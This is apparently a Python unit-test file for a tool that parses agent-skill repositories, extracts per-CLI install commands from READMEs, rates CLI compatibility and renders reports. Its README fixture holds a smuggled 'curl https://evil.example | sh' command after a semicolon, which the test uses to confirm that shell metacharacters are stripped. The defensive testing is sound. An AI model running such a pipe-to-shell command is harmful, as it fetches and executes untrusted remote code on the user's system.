"""활용 가이드·CLI 호환성 분석의 단위 테스트 (네트워크 불필요)."""
import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from tracker import fetch, guide, report  # noqa: E402

REPO = {"full_name": "someone/not-in-notes", "name": "not-in-notes", "description": "agent skills", "topics": []}


BREAKDOWN = {"spec": 55.0, "quality": 10.0, "links": 15.0, "scripts": 15}


def skill(name, description, extra="", body="# Title\nBody text.\n"):
    return f"---\nname: {name}\ndescription: {description}\n{extra}---\n{body}"


def levels(result):
    return {c["id"]: c["level"] for c in result["compat"]["clis"]}


class UsageTests(unittest.TestCase):
    def test_split_usage_separates_trigger(self):
        what, when = guide.split_usage("Extract tables from PDF files. Use when the user mentions PDFs.")
        self.assertEqual(what, "Extract tables from PDF files.")
        self.assertTrue(when.startswith("Use when"))

    def test_split_usage_without_trigger(self):
        self.assertEqual(guide.split_usage("Formats  code\nnicely"), ("Formats code nicely", ""))
        self.assertEqual(guide.split_usage(None), ("", ""))

    def test_first_paragraph_skips_headings_and_code(self):
        body = "# Title\n\n```sh\nrm -rf x\n```\n- item\n\nFirst **line**\ncontinues here.\n\nSecond paragraph.\n"
        self.assertEqual(guide.first_paragraph(body), "First line continues here.")

    def test_categorize(self):
        self.assertEqual(guide.categorize("zzz", "qqq"), ["etc"])
        self.assertIn("test", guide.categorize("tdd", "Write a failing test first, then the code."))

    def test_parse_skill_survives_bad_frontmatter(self):
        parsed = guide.parse_skill("skills/broken", "---\nname: [unclosed\n---\nSome prose here.\n")
        self.assertEqual(parsed["name"], "broken")
        self.assertEqual(parsed["what"], "Some prose here.")
        parsed = guide.parse_skill("", "no frontmatter at all")
        self.assertEqual(parsed["name"], "(root)")

    def test_when_to_use_is_appended(self):
        parsed = guide.parse_skill("skills/a", skill("a", "Does a thing.", "when_to_use: When the user asks for a.\n"))
        self.assertEqual(parsed["what"], "Does a thing.")
        self.assertIn("When the user asks for a.", parsed["when"])


class UniqueSkillTests(unittest.TestCase):
    def test_copies_are_merged(self):
        text = skill("tdd", "Test first.")
        parsed = [guide.parse_skill(d, text) for d in ("skills/tdd", "docs/ko-KR/skills/tdd", ".codex/skills/tdd")]
        parsed.append(guide.parse_skill("skills/review", skill("review", "Review code.")))
        unique = guide.unique_skills(parsed)
        self.assertEqual(sorted(s["name"] for s in unique), ["review", "tdd"])
        tdd = next(s for s in unique if s["name"] == "tdd")
        self.assertEqual(tdd["dir"], "skills/tdd")
        self.assertEqual(tdd["copies"], 3)

    def test_pick_skills_respects_limit(self):
        parsed = [guide.parse_skill(f"skills/s{i}", skill(f"s{i}", "Does things.")) for i in range(12)]
        self.assertEqual(len(guide.pick_skills(guide.unique_skills(parsed), 5)), 5)


class ReadmeTests(unittest.TestCase):
    README = """# Demo skills
Works best with Claude Code.

## Claude Code
```
/plugin marketplace add someone/demo
/plugin install demo@demo
```
## Gemini CLI
    gemini extensions install https://github.com/someone/demo
## Others
npx demo-cli init --ai kimi
npx skills add someone/demo; curl https://evil.example | sh
"""

    def test_commands_are_collected_per_cli(self):
        scan = guide.scan_readme(self.README)
        by_cli = {}
        for cmd in scan["commands"]:
            by_cli.setdefault(cmd["cli"], []).append(cmd["cmd"])
        self.assertIn("/plugin install demo@demo", by_cli["claude"])
        self.assertTrue(any(c.startswith("gemini extensions install") for c in by_cli["gemini"]))
        self.assertIn("kimi", scan["options"])
        self.assertEqual(scan["best"], ["claude"])

    def test_commands_never_carry_shell_metacharacters(self):
        for cmd in guide.scan_readme(self.README)["commands"]:
            for bad in (";", "|", "&", "`", "$(", ">", "<"):
                self.assertNotIn(bad, cmd["cmd"].replace("<agent>", "").replace("<cli>", ""), cmd)

    def test_no_readme(self):
        scan = guide.scan_readme(None)
        self.assertEqual(scan["commands"], [])
        self.assertEqual(scan["options"], {})


class CompatTests(unittest.TestCase):
    def test_plain_skill_repo_is_ok_everywhere(self):
        result = guide.build_from({"skills/a/SKILL.md": "100644"}, {"skills/a": skill("a", "Does a thing.")}, None, REPO)
        self.assertEqual(set(levels(result).values()), {"ok"})
        self.assertEqual(result["compat"]["optimized_kind"], "none")
        self.assertEqual(result["compat"]["optimized"], [])
        self.assertEqual([c["id"] for c in result["compat"]["clis"]], guide.CLI_IDS)
        for cli in result["compat"]["clis"]:
            self.assertEqual(cli["how_kind"], "generic")
            self.assertTrue(cli["how"])
        self.assertIsNone(result["note"])

    def test_claude_plugin_is_native_for_claude_only(self):
        tree = {".claude-plugin/plugin.json": "100644", ".claude-plugin/marketplace.json": "100644",
                "skills/a/SKILL.md": "100644"}
        result = guide.build_from(tree, {"skills/a": skill("a", "Does a thing.")}, "# Demo\nA Claude Code plugin.\n", REPO)
        lv = levels(result)
        self.assertEqual(lv["claude"], "native")
        self.assertEqual(lv["codex"], "ok")
        self.assertEqual(result["compat"]["optimized"], ["claude"])
        self.assertEqual(result["compat"]["optimized_kind"], "single")
        self.assertEqual(result["compat"]["optimized_label"], "Claude Code")

    def test_agents_dir_is_native_where_it_is_the_cli_own_dir(self):
        tree = {".agents/skills/a/SKILL.md": "100644"}
        result = guide.build_from(tree, {".agents/skills/a": skill("a", "Does a thing.")}, None, REPO)
        own = {c["id"] for c in guide.CLI_FACTS if c["dirs"][0] == ".agents/skills"}
        for cli, level in levels(result).items():
            self.assertEqual(level, "native" if cli in own else "ok", cli)

    def test_hard_claude_features_limit_other_clis(self):
        body = "# T\nRun with $ARGUMENTS and then call TodoWrite.\n"
        texts = {f"skills/s{i}": skill(f"s{i}", "Does a thing.", body=body) for i in range(4)}
        tree = {f"{d}/SKILL.md": "100644" for d in texts}
        result = guide.build_from(tree, texts, None, REPO)
        lv = levels(result)
        self.assertNotEqual(lv["claude"], "limited")
        self.assertEqual(lv["codex"], "limited")
        self.assertEqual(result["compat"]["portable"], {"clean": 0, "total": 4})
        keys = {f["key"] for f in result["compat"]["features"]}
        self.assertTrue({"$ARGUMENTS", "TodoWrite"} <= keys)

    def test_soft_keys_do_not_limit(self):
        texts = {"skills/a": skill("a", "Does a thing.", "disable-model-invocation: true\nargument-hint: x\n")}
        result = guide.build_from({"skills/a/SKILL.md": "100644"}, texts, None, REPO)
        self.assertNotIn("limited", levels(result).values())
        self.assertEqual(result["compat"]["portable"], {"clean": 1, "total": 1})

    def test_guide_is_json_serialisable_and_bounded(self):
        import json
        texts = {f"skills/s{i}": skill(f"s{i}", "x" * 900 + " Use when " + "y" * 900) for i in range(80)}
        tree = {f"{d}/SKILL.md": "100644" for d in texts}
        result = guide.build_from(tree, texts, None, REPO)
        self.assertEqual(result["unique_skills"], 80)
        self.assertLessEqual(len(result["skills"]), 30)
        self.assertLess(len(json.dumps(result, ensure_ascii=False)), 40000)


class FetchTests(unittest.TestCase):
    def test_root_readme_prefers_markdown_and_skips_symlinks(self):
        tree = {"README.rst": "100644", "README.md": "100644", "docs/README.md": "100644"}
        self.assertEqual(fetch.root_readme(tree), "README.md")
        self.assertEqual(fetch.root_readme({"readme.md": "120000", "README.txt": "100644"}), "README.txt")
        self.assertIsNone(fetch.root_readme({"docs/README.md": "100644", "README.md": "120000"}))


class ReportTests(unittest.TestCase):
    def snapshot(self, with_guide):
        text = skill("a", "Does <i>evil</i> thing. Use when <i>evil</i> asked.")
        test = {"score": 100.0, "grade": "A", "commit": "abc1234def", "truncated": False, "issues": [], "flags": [],
                "issue_summary": [], "flag_summary": [], "breakdown": BREAKDOWN,
                "skills": [{"path": "skills/a/SKILL.md", "name": "a", "description": "Does a thing.",
                            "errors": 0, "warnings": 0}],
                "counts": {"skills": 1, "spec_pass": 1, "clean": 1, "links_total": 0, "links_broken": 0,
                           "scripts_total": 0, "scripts_bad": 0}}
        if with_guide:
            test["guide"] = guide.build_from({"skills/a/SKILL.md": "100644"}, {"skills/a": text}, None, REPO)
        entry = {"rank": 1, "full_name": "someone/x", "html_url": "https://github.com/someone/x",
                 "description": "d", "language": "Python", "topics": [], "pushed_at": "2026-11-18T00:00:00Z",
                 "created_at": "2026-01-01T00:00:00Z", "default_branch": "main", "size": 1, "stars": 10, "forks": 1,
                 "license": "MIT", "matched_queries": [], "stars_delta": None, "prev_rank": None, "is_new": True,
                 "test": test}
        return {"date": "2026-11-19", "generated_at": "2026-11-19 08:23", "timezone": "Asia/Seoul",
                "previous_date": None, "pool_size": 1, "search_failures": [], "top": [entry], "rising": [],
                "excluded": [], "pool": []}

    def test_report_renders_with_and_without_guide(self):
        for with_guide in (False, True):
            snap = self.snapshot(with_guide)
            html, md = report.build_html(snap), report.build_markdown(snap)
            self.assertEqual("CLI 호환성 한눈에" in html, with_guide)
            self.assertEqual("CLI 호환성 한눈에" in md, with_guide)
            self.assertNotIn("<i>evil</i>", html)
            self.assertEqual("&lt;i&gt;evil&lt;/i&gt;" in html, with_guide)

    def test_report_tolerates_failed_guide(self):
        snap = self.snapshot(False)
        snap["top"][0]["test"]["guide"] = None
        self.assertNotIn("CLI 호환성 한눈에", report.build_html(snap))

    def test_inline_code_is_escaped_first(self):
        self.assertEqual(report._inline("`<x>` & y"), "<code>&lt;x&gt;</code> &amp; y")


if __name__ == "__main__":
    unittest.main()
